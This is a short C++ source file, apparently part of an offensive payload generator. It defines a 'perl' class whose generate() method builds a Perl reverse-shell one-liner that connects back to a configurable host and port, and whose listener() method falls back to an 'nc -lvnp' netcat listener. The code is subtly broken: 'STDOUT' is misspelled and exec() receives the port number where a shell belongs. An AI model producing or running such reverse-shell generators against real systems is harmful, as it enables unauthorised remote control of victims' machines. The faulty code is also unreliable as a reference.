#include "Perl_Payload.h"
#include "../../listeners/ListenerFactory.h"

std::string PerlPayload::name() const {
return "perl";
}

std::string PerlPayload::generate(const Options& opts) const {
    return "perl -e \'use Socket;$i=\"" + opts.host + "\";$p=" + std::to_string(opts.port) + ";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOOUT,\">&S\");exec(\"" + std::to_string(opts.port) + " -i\");};\'";
}

std::string PerlPayload::listener(const Options& opts) const {
    ListenerFactory factory;
    IListener* listener = factory.get(opts.listenerType);
    return listener ? listener->command(opts) : "nc -lvnp " + std::to_string(opts.port);
}